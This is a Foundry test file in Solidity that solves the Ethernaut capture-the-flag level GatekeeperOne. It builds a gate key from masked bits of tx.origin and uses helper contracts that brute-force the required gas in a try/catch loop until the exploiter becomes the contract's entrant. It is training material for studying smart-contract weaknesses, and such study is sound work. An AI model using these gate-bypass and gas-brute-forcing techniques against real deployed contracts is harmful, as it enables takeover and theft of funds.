// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/GatekeeperOne.sol';
import '@forge-std/Test.sol';
import '@forge-std/console.sol';

contract Helper1 {
  constructor(address _target, bytes8 _gateKey) {
    // How to find the right gas value to send to the contract?!
    // Calculating exact gas usage for each operation proved challenging...
    // I opted for a brute force approach with binary search (dichotomy) to find the value.
    // Steps:
    // 1. Modified GatekeeperOne's gate two to: `require(gasleft() >= 8191*10)`.
    // 2. Started with base gas of 8191*10 (81,910) + 500 gas = 82,410. This succeeded.
    // I started with a higher base because I noticed that using 10k or 20k gas reverts with an OutOfGas error.
    // 3. Tried base + 250 gas = 82,160. This failed. Same with 300 and 400.
    // 4. Iteratively narrowed down:
    //    - base + 413 gas => failed
    //    - base + 414 gas => succeeded
    // 5. It turns out this brute force approach no longer works unfortunately...
    require(
      GatekeeperOne(_target).enter{gas: 8191 * 10 + 414}(_gateKey),
      'Exploit succeeded'
    );
  }
}

contract Helper2 {
  constructor(address _target, bytes8 _gateKey) {
    GatekeeperOne target = GatekeeperOne(_target);
    uint256 gasAmount = 8191 * 10;
    bool success = false;
    uint256 i;
    while (!success) {
      i++;
      gasAmount += 1;
      try target.enter{gas: gasAmount}(_gateKey) returns (bool result) {
        success = result;
      } catch {}
    }
    console.log('Exploit succeeded in %d tries', i);
  }
}

contract GatekeeperOneExploit is Test {
  GatekeeperOne target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new GatekeeperOne();
    console.log('Target contract deployed');
    vm.stopPrank();
  }

  // The brute force no longer works.
  // function testExploit1() public {
  //   address entrant = target.entrant();
  //   console.log('Current entrant: %s', entrant);
  //   assertEq(entrant, address(0x0));

  //   // Set exploiter to be the msg.sender.
  //   // Note that we also pass a second argument to override cast's default tx.origin.
  //   vm.startPrank(exploiter, exploiter);
  //   bytes8 gateKey = bytes8(
  //     // Set the first significant byte to 0x11 (a random value) and all the other bytes to 0.
  //     // This enables to have:
  //     // - uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
  //     // - uint32(uint64(_gateKey)) != uint64(_gateKey)
  //     (uint64(0x1100000000000000) & 0xFF00000000000000) |
  //       // Set the two last significant bytes to the two last significant bytes of tx.origin.
  //       // This enables to have: uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
  //       (uint64(uint16(uint160(exploiter))) & 0x000000000000FFFF)
  //   );
  //   new Helper1(address(target), gateKey);
  //   vm.stopPrank();

  //   entrant = target.entrant();
  //   console.log('New entrant: %s', entrant);
  //   assertEq(entrant, exploiter);
  // }

  function testExploit2() public {
    address entrant = target.entrant();
    console.log('Current entrant: %s', entrant);
    assertEq(entrant, address(0x0));

    // Set exploiter to be the msg.sender.
    // Note that we also pass a second argument to override cast's default tx.origin.
    // This is required for gate 1.
    vm.startPrank(exploiter, exploiter);
    bytes8 gateKey = bytes8(
      // Set the first significant byte to 0x11 (a random value) and all the other bytes to 0.
      // This enables to have:
      // - uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
      // - uint32(uint64(_gateKey)) != uint64(_gateKey)
      (uint64(0x1100000000000000) & 0xFF00000000000000) |
        // Set the two last significant bytes to the two last significant bytes of tx.origin.
        // This enables to have: uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
        (uint64(uint16(uint160(exploiter))) & 0x000000000000FFFF)
    );
    new Helper2(address(target), gateKey);
    vm.stopPrank();

    entrant = target.entrant();
    console.log('New entrant: %s', entrant);
    assertEq(entrant, exploiter);
  }
}
